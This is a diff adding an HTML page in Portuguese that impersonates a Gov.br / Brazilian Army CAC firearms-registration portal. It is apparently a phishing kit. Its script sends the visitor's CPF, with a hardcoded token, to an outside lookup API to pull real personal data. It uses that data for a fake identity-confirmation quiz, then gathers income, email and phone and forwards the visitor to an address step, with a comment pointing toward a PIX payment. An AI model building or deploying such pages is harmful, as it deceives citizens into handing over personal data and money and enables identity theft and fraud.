@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registro CAC - Exército Brasileiro</title>
+    <link rel="icon" type="image/png" href="images/favicon.png">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #f5f5f5;
+            color: #1a1a2e;
+        }
+        
+        .page {
+            display: none;
+        }
+        
+        .page.active {
+            display: block;
+        }
+        
+        .header {
+            background: #fff;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.08);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .header-logo img {
+            height: 35px;
+        }
+        
+        .header-user {
+            background: #1351b4;
+            color: #fff;
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 20px auto;
+            padding: 30px 20px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        
+        .step-title {
+            text-align: center;
+            font-size: 20px;
+            font-weight: 600;
+            color: #1a1a2e;
+            margin-bottom: 30px;
+            line-height: 1.4;
+        }
+        
+        .question {
+            margin-bottom: 25px;
+        }
+        
+        .question-number {
+            background: #1351b4;
+            color: #fff;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 16px;
+            margin-bottom: 12px;
+        }
+        
+        .question-text {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1a1a2e;
+            margin-bottom: 15px;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            color: #333;
+            background: #fff;
+            transition: all 0.3s;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #1351b4;
+            background: #f8f9fa;
+        }
+        
+        .option-button {
+            width: 100%;
+            padding: 16px;
+            margin-bottom: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            background: #fff;
+            color: #333;
+            font-size: 15px;
+            text-align: left;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .option-button:hover {
+            border-color: #1351b4;
+            background: #f8f9fa;
+        }
+        
+        .option-button.selected {
+            border-color: #1351b4;
+            background: #e3f2fd;
+            color: #1351b4;
+            font-weight: 600;
+        }
+        
+        .btn-confirmar {
+            width: 100%;
+            padding: 16px;
+            background: #1351b4;
+            color: #fff;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 12px rgba(19, 81, 180, 0.3);
+            margin-top: 20px;
+        }
+        
+        .btn-confirmar:hover {
+            background: #0c3a8c;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(19, 81, 180, 0.4);
+        }
+        
+        .btn-confirmar:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .error-message {
+            color: #d32f2f;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+        }
+        
+        .footer {
+            background: #071d41;
+            color: #fff;
+            padding: 30px 20px;
+            margin-top: 40px;
+            text-align: center;
+        }
+        
+        .footer-logo img {
+            height: 50px;
+            filter: brightness(0) invert(1);
+            margin-bottom: 15px;
+        }
+        
+        .footer-text {
+            font-size: 13px;
+            color: #ccc;
+        }
+        
+        /* Landing page styles */
+        .main-title h1 {
+            font-size: 48px;
+            font-weight: 700;
+            line-height: 1.1;
+            margin: 0;
+            text-align: center;
+        }
+        
+        .registre { color: #1a5f3e; display: block; }
+        .seu { color: #d4af37; }
+        .cac { color: #1351b4; }
+        
+        .subtitle {
+            text-align: center;
+            color: #1351b4;
+            font-size: 16px;
+            font-style: italic;
+            margin: 10px 0 30px;
+        }
+        
+        .description-box {
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .description-title {
+            color: #1351b4;
+            font-size: 20px;
+            font-weight: 600;
+            text-align: center;
+            line-height: 1.4;
+            margin-bottom: 10px;
+        }
+        
+        .description-subtitle {
+            color: #1351b4;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        .btn-iniciar {
+            display: block;
+            width: 240px;
+            margin: 0 auto 30px;
+            padding: 16px;
+            background: #2d8659;
+            color: #fff;
+            border: none;
+            border-radius: 50px;
+            font-size: 20px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 12px rgba(45, 134, 89, 0.3);
+        }
+        
+        .btn-iniciar:hover {
+            background: #236b46;
+            transform: translateY(-2px);
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-logo">
+            <img src="images%20gov/govbr.webp" alt="Gov.br">
+        </div>
+        <div class="header-user" id="headerUser" style="display: none;">
+            👤 <span id="userName">Usuário</span>
+        </div>
+    </div>
+    
+    <!-- PÁGINA 1: Landing Gov.br -->
+    <div id="page1" class="page active">
+        <div class="container">
+            <div class="main-title">
+                <h1>
+                    <span class="registre">REGISTRE</span>
+                    <span class="seu-cac"><span class="seu">SEU</span> <span class="cac">CAC</span></span>
+                </h1>
+            </div>
+            <p class="subtitle">e Regularize sua Situação!</p>
+            <div class="description-box">
+                <h2 class="description-title">Conceder Certificado de Registro Pessoa Física - Colecionador, Atirador Desportivo e Caçador (CAC)</h2>
+                <p class="description-subtitle">" CR PF " , " Certificado de Registro"</p>
+            </div>
+            <button class="btn-iniciar" onclick="iniciarCadastro()">Iniciar</button>
+        </div>
+    </div>
+    
+    <!-- PÁGINA 2: CPF -->
+    <div id="page2" class="page">
+        <div class="container">
+            <!-- Logo do Programa CAC -->
+            <div style="text-align: center; margin-bottom: 30px;">
+                <img src="images%20gov/conta_govbr_v2_defeso-eleitoral.jpg" alt="Programa CAC" style="max-width: 100%; height: auto; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">
+            </div>
+            
+            <h2 class="step-title">Identifique-se no gov.br com:</h2>
+            <div class="question">
+                <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 15px;">
+                    <div style="background: #1351b4; color: #fff; width: 40px; height: 40px; border-radius: 8px; display: flex; align-items: center; justify-content: center;">
+                        <img src="images%20gov/id-card-solid.png" alt="ID" style="width: 24px; height: 24px; filter: brightness(0) invert(1);">
+                    </div>
+                    <div>
+                        <div class="question-text" style="margin: 0;">Número do CPF</div>
+                        <p style="color: #666; font-size: 13px; margin: 5px 0 0 0;">Digite seu CPF para acessar sua conta gov.br</p>
+                    </div>
+                </div>
+                <input type="tel" id="cpfInput" class="input-field" placeholder="Digite seu CPF" maxlength="14">
+                <div class="error-message" id="cpfError">CPF inválido. Por favor, verifique.</div>
+            </div>
+            <button class="btn-confirmar" onclick="consultarCPF()">Continuar</button>
+        </div>
+    </div>
+    
+    <!-- PÁGINA 3: Nome -->
+    <div id="page3" class="page">
+        <div class="container">
+            <h2 class="step-title">Confirme seus dados para o cadastro no Programa CAC do Brasil</h2>
+            <div class="question">
+                <div class="question-number">1</div>
+                <div class="question-text">Qual é seu nome completo?</div>
+                <button class="option-button" onclick="selecionarOpcao(this, 'nome', 0)">Carregando...</button>
+                <button class="option-button" onclick="selecionarOpcao(this, 'nome', 1)">Carregando...</button>
+                <button class="option-button" onclick="selecionarOpcao(this, 'nome', 2)">Carregando...</button>
+            </div>
+            <button class="btn-confirmar" onclick="proximaEtapa(4)" disabled>Confirmar</button>
+        </div>
+    </div>
+    
+    <!-- PÁGINA 4: Data Nascimento -->
+    <div id="page4" class="page">
+        <div class="container">
+            <h2 class="step-title">Confirme seus dados para o cadastro no Programa CAC do Brasil</h2>
+            <div class="question">
+                <div class="question-number">2</div>
+                <div class="question-text">Qual é sua data de nascimento?</div>
+                <button class="option-button" onclick="selecionarOpcao(this, 'dataNascimento', 0)">Carregando...</button>
+                <button class="option-button" onclick="selecionarOpcao(this, 'dataNascimento', 1)">Carregando...</button>
+                <button class="option-button" onclick="selecionarOpcao(this, 'dataNascimento', 2)">Carregando...</button>
+            </div>
+            <button class="btn-confirmar" onclick="proximaEtapa(5)" disabled>Confirmar</button>
+        </div>
+    </div>
+    
+    <!-- PÁGINA 5: Renda Salarial -->
+    <div id="page5" class="page">
+        <div class="container">
+            <h2 class="step-title">Confirme seus dados para o cadastro no Programa CAC do Brasil</h2>
+            <div class="question">
+                <div class="question-number">3</div>
+                <div class="question-text">Qual é sua faixa salarial atual?</div>
+                <button class="option-button" onclick="selecionarOpcao(this, 'renda', 0)">Desempregado(a)</button>
+                <button class="option-button" onclick="selecionarOpcao(this, 'renda', 1)">Até R$ 2.640 (até 2 Salários Mínimos)</button>
+                <button class="option-button" onclick="selecionarOpcao(this, 'renda', 2)">De R$ 2.641 A R$ 6.600 (2 A 5 Salários Mínimos)</button>
+                <button class="option-button" onclick="selecionarOpcao(this, 'renda', 3)">De R$ 6.601 A R$ 13.200 (5 A 10 Salários Mínimos)</button>
+                <button class="option-button" onclick="selecionarOpcao(this, 'renda', 4)">Acima De R$ 13.200 (mais De 10 Salários Mínimos)</button>
+            </div>
+            <button class="btn-confirmar" onclick="proximaEtapa(6)" disabled>Confirmar</button>
+        </div>
+    </div>
+    
+    <!-- PÁGINA 6: Email -->
+    <div id="page6" class="page">
+        <div class="container">
+            <h2 class="step-title">Confirme seus dados para o cadastro no Programa CAC do Brasil</h2>
+            <div class="question">
+                <div class="question-number">4</div>
+                <div class="question-text">Qual é o seu email?</div>
+                <input type="email" id="emailInput" class="input-field" placeholder="Digite seu email">
+                <div class="error-message" id="emailError">Email inválido.</div>
+            </div>
+            <button class="btn-confirmar" onclick="proximaEtapa(7)">Confirmar</button>
+        </div>
+    </div>
+    
+    <!-- PÁGINA 7: Telefone -->
+    <div id="page7" class="page">
+        <div class="container">
+            <h2 class="step-title">Confirme seus dados para o cadastro no Programa CAC do Brasil</h2>
+            <div class="question">
+                <div class="question-number">5</div>
+                <div class="question-text">Qual é o seu telefone?</div>
+                <input type="tel" id="telefoneInput" class="input-field" placeholder="(11) 99999-9999" maxlength="15">
+                <div class="error-message" id="telefoneError">Telefone inválido.</div>
+            </div>
+            <button class="btn-confirmar" onclick="finalizarCadastro()">Confirmar</button>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-logo">
+            <img src="images%20gov/govbr.webp" alt="Gov.br">
+        </div>
+        <div class="footer-text">
+            Todo o conteúdo deste site está publicado sob a licença<br>
+            <strong>Sistema de Registro CAC — Todos os direitos reservados</strong>
+        </div>
+    </footer>
+    
+    <script>
+        let dadosUsuario = {};
+        let dadosAPI = {};
+        
+        function iniciarCadastro() {
+            mudarPagina(1, 2);
+        }
+        
+        function mudarPagina(de, para) {
+            document.getElementById(`page${de}`).classList.remove('active');
+            document.getElementById(`page${para}`).classList.add('active');
+            window.scrollTo(0, 0);
+        }
+        
+        // Máscara CPF
+        document.addEventListener('DOMContentLoaded', function() {
+            const cpfInput = document.getElementById('cpfInput');
+            if (cpfInput) {
+                cpfInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length <= 11) {
+                        value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                        value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                        value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+                    }
+                    e.target.value = value;
+                    document.getElementById('cpfError').style.display = 'none';
+                });
+            }
+            
+            const telefoneInput = document.getElementById('telefoneInput');
+            if (telefoneInput) {
+                telefoneInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length <= 11) {
+                        value = value.replace(/^(\d{2})(\d)/g, '($1) $2');
+                        value = value.replace(/(\d)(\d{4})$/, '$1-$2');
+                    }
+                    e.target.value = value;
+                });
+            }
+        });
+        
+        function consultarCPF() {
+            const cpf = document.getElementById('cpfInput').value;
+            const cpfLimpo = cpf.replace(/\D/g, '');
+            
+            if (!validarCPF(cpfLimpo)) {
+                document.getElementById('cpfError').style.display = 'block';
+                return;
+            }
+            
+            dadosUsuario.cpf = cpf;
+            localStorage.setItem('cpf', cpf);
+            
+            // Busca dados na API
+            const token = '76418167-38e2-46aa-acf1-51ed15b4db9f';
+            const apiUrl = `https://api.amnesiatecnologia.lat/?token=${token}&cpf=${cpfLimpo}&t=${Date.now()}`;
+            
+            const btnContinuar = document.querySelector('#page2 .btn-confirmar');
+            btnContinuar.disabled = true;
+            btnContinuar.textContent = 'Consultando...';
+            
+            fetch(apiUrl)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('=== RESPOSTA DA API ===');
+                    console.log('URL chamada:', apiUrl);
+                    console.log('Dados recebidos:', data);
+                    console.log('Tipo:', typeof data);
+                    console.log('Keys:', Object.keys(data));
+                    
+                    // A API retorna os dados dentro de um objeto "DADOS"
+                    if (data.DADOS) {
+                        console.log('Encontrado objeto DADOS!');
+                        dadosAPI = data.DADOS;
+                    } else {
+                        dadosAPI = data;
+                    }
+                    
+                    console.log('Dados finais para usar:', dadosAPI);
+                    console.log('======================');
+                    
+                    preencherOpcoes();
+                    mudarPagina(2, 3);
+                })
+                .catch(error => {
+                    console.error('=== ERRO NA API ===');
+                    console.error('Erro:', error);
+                    console.error('URL:', apiUrl);
+                    console.error('==================');
+                    dadosAPI = {};
+                    preencherOpcoesGenericas();
+                    mudarPagina(2, 3);
+                });
+        }
+        
+        function validarCPF(cpf) {
+            if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+            let soma = 0, resto;
+            for (let i = 1; i <= 9; i++) soma += parseInt(cpf.substring(i-1, i)) * (11 - i);
+            resto = (soma * 10) % 11;
+            if ((resto === 10) || (resto === 11)) resto = 0;
+            if (resto !== parseInt(cpf.substring(9, 10))) return false;
+            soma = 0;
+            for (let i = 1; i <= 10; i++) soma += parseInt(cpf.substring(i-1, i)) * (12 - i);
+            resto = (soma * 10) % 11;
+            if ((resto === 10) || (resto === 11)) resto = 0;
+            return resto === parseInt(cpf.substring(10, 11));
+        }
+        
+        function preencherOpcoes() {
+            console.log('Dados completos da API:', dadosAPI);
+            
+            // Tenta pegar o nome de várias formas possíveis
+            let nomeReal = dadosAPI.nome || dadosAPI.name || dadosAPI.NOME || 
+                          dadosAPI.nome_completo || dadosAPI.full_name || 
+                          dadosAPI.Nome || 'João Silva Santos';
+            
+            // Tenta pegar data nascimento de várias formas (ADICIONADO data_nascimento)
+            let dataReal = dadosAPI.data_nascimento || dadosAPI.nascimento || dadosAPI.birthdate || 
+                          dadosAPI.NASCIMENTO || dadosAPI.dt_nascimento || '01/01/1990';
+            
+            console.log('Nome detectado:', nomeReal);
+            console.log('Data detectada:', dataReal);
+            
+            // Salva pra usar depois
+            dadosUsuario.nomeCompleto = nomeReal;
+            
+            // Nome
+            const nomes = gerarOpcoesNome(nomeReal);
+            document.querySelectorAll('#page3 .option-button').forEach((btn, i) => {
+                btn.textContent = nomes[i];
+                btn.dataset.valor = nomes[i];
+            });
+            
+            // Data Nascimento
+            const datas = gerarOpcoesData(dataReal);
+            document.querySelectorAll('#page4 .option-button').forEach((btn, i) => {
+                btn.textContent = datas[i];
+                btn.dataset.valor = datas[i];
+            });
+            
+            // Preenche email se tiver
+            let emailAPI = dadosAPI.email || dadosAPI.EMAIL || dadosAPI.e_mail || '';
+            if (emailAPI) {
+                document.getElementById('emailInput').value = emailAPI;
+                console.log('Email preenchido:', emailAPI);
+            }
+            
+            // Preenche telefone se tiver
+            let telAPI = dadosAPI.telefone || dadosAPI.phone || dadosAPI.celular || 
+                        dadosAPI.TELEFONE || dadosAPI.CELULAR || dadosAPI.tel || '';
+            if (telAPI) {
+                document.getElementById('telefoneInput').value = formatarTelefone(telAPI);
+                console.log('Telefone preenchido:', telAPI);
+            }
+            
+            // NÃO atualiza o header ainda - só depois de selecionar o nome
+        }
+        
+        function capitalizarNome(nome) {
+            return nome.toLowerCase().split(' ').map(palavra => {
+                if (palavra.length > 2) {
+                    return palavra.charAt(0).toUpperCase() + palavra.slice(1);
+                }
+                return palavra; // mantém preposições (de, da, do) em minúscula
+            }).join(' ');
+        }
+        
+        function gerarOpcoesNome(nomeCorreto) {
+            console.log('Gerando opções para nome:', nomeCorreto);
+            
+            // Capitaliza o nome correto
+            const nomeCapitalizado = capitalizarNome(nomeCorreto);
+            const opcoes = [nomeCapitalizado];
+            
+            // Nomes aleatórios TOTALMENTE diferentes
+            const nomesAleatorios = [
+                'Carlos Eduardo Silva Costa', 
+                'Ana Paula Santos Oliveira', 
+                'José Roberto Oliveira Lima', 
+                'Mariana Costa Lima Pereira',
+                'Pedro Henrique Santos Silva',
+                'Juliana Ferreira Costa Santos',
+                'Rafael Almeida Souza Cruz',
+                'Fernanda Rodrigues Lima Santos',
+                'Lucas Gabriel Costa Ferreira',
+                'Beatriz Oliveira Santos Lima'
+            ];
+            
+            // Embaralha o array
+            nomesAleatorios.sort(() => Math.random() - 0.5);
+            
+            // Adiciona 2 nomes diferentes
+            for (let i = 0; i < nomesAleatorios.length && opcoes.length < 3; i++) {
+                const nomeAleatorio = nomesAleatorios[i];
+                // Verifica se é realmente diferente (não contém as mesmas palavras)
+                const palavrasCorreto = nomeCapitalizado.toLowerCase().split(' ');
+                const palavrasAleatorio = nomeAleatorio.toLowerCase().split(' ');
+                const temPalavraIgual = palavrasCorreto.some(p => palavrasAleatorio.includes(p));
+                
+                if (!temPalavraIgual && !opcoes.includes(nomeAleatorio)) {
+                    opcoes.push(nomeAleatorio);
+                }
+            }
+            
+            // Se ainda não tem 3, força adicionar
+            while (opcoes.length < 3) {
+                opcoes.push(nomesAleatorios[opcoes.length - 1]);
+            }
+            
+            // Embaralha as opções para o nome correto não estar sempre em primeiro
+            opcoes.sort(() => Math.random() - 0.5);
+            
+            console.log('Opções geradas:', opcoes);
+            return opcoes;
+        }
+        
+        function gerarOpcoesData(dataCorreta) {
+            console.log('Gerando opções para data:', dataCorreta);
+            const opcoes = [dataCorreta];
+            const partes = dataCorreta.split('/');
+            
+            if (partes.length === 3) {
+                // Gera 2 datas TOTALMENTE diferentes
+                const dia = parseInt(partes[0]);
+                const mes = parseInt(partes[1]);
+                const ano = parseInt(partes[2]);
+                
+                // Data 2: muda dia e ano
+                const dia2 = (dia + 10) % 28 + 1;
+                const ano2 = ano - 8;
+                opcoes.push(`${dia2.toString().padStart(2, '0')}/${partes[1]}/${ano2}`);
+                
+                // Data 3: muda mês e ano
+                const mes3 = (mes + 5) % 12 + 1;
+                const ano3 = ano + 6;
+                opcoes.push(`${partes[0]}/${mes3.toString().padStart(2, '0')}/${ano3}`);
+            } else {
+                opcoes.push('15/06/1985', '22/11/1992');
+            }
+            
+            // Embaralha as opções
+            opcoes.sort(() => Math.random() - 0.5);
+            
+            console.log('Opções geradas:', opcoes);
+            return opcoes;
+        }
+        
+        function preencherOpcoesGenericas() {
+            document.querySelectorAll('#page3 .option-button').forEach((btn, i) => {
+                const nomes = ['João Silva Santos', 'Carlos Eduardo Oliveira', 'Ana Paula Costa'];
+                btn.textContent = nomes[i];
+                btn.dataset.valor = nomes[i];
+            });
+            
+            document.querySelectorAll('#page4 .option-button').forEach((btn, i) => {
+                const datas = ['01/01/1990', '15/06/1985', '22/11/1992'];
+                btn.textContent = datas[i];
+                btn.dataset.valor = datas[i];
+            });
+            
+        }
+        
+        function selecionarOpcao(button, campo, index) {
+            const page = button.closest('.page');
+            page.querySelectorAll('.option-button').forEach(btn => btn.classList.remove('selected'));
+            button.classList.add('selected');
+            dadosUsuario[campo] = button.dataset.valor || button.textContent;
+            page.querySelector('.btn-confirmar').disabled = false;
+            
+            // Se selecionou o NOME, agora sim mostra no header
+            if (campo === 'nome') {
+                const primeiroNome = dadosUsuario.nome.split(' ')[0];
+                document.getElementById('userName').textContent = capitalizarNome(primeiroNome);
+                document.getElementById('headerUser').style.display = 'flex';
+            }
+        }
+        
+        function formatarTelefone(tel) {
+            const nums = tel.replace(/\D/g, '');
+            if (nums.length === 11) {
+                return `(${nums.substr(0,2)}) ${nums.substr(2,5)}-${nums.substr(7,4)}`;
+            }
+            return tel;
+        }
+        
+        function proximaEtapa(proximaPagina) {
+            const paginaAtual = document.querySelector('.page.active').id.replace('page', '');
+            
+            if (proximaPagina === 7) {
+                // Valida email
+                const email = document.getElementById('emailInput').value;
+                if (!email || !email.includes('@')) {
+                    document.getElementById('emailError').style.display = 'block';
+                    return;
+                }
+                dadosUsuario.email = email;
+            }
+            
+            mudarPagina(parseInt(paginaAtual), proximaPagina);
+        }
+        
+        function finalizarCadastro() {
+            const telefone = document.getElementById('telefoneInput').value;
+            const telLimpo = telefone.replace(/\D/g, '');
+            
+            if (telLimpo.length < 10) {
+                document.getElementById('telefoneError').style.display = 'block';
+                return;
+            }
+            
+            dadosUsuario.telefone = telefone;
+            
+            // Salva tudo
+            localStorage.setItem('dadosCompletos', JSON.stringify(dadosUsuario));
+            localStorage.setItem('nome', dadosUsuario.nome || '');
+            localStorage.setItem('telefone', telefone);
+            localStorage.setItem('email', dadosUsuario.email || '');
+            
+            // Vai pro ENDEREÇO (etapa 2) ao invés do PIX direto
+            window.location.href = 'endereco%20etapa%202/index.html';
+        }
+    </script>
+</body>
+
+</html>
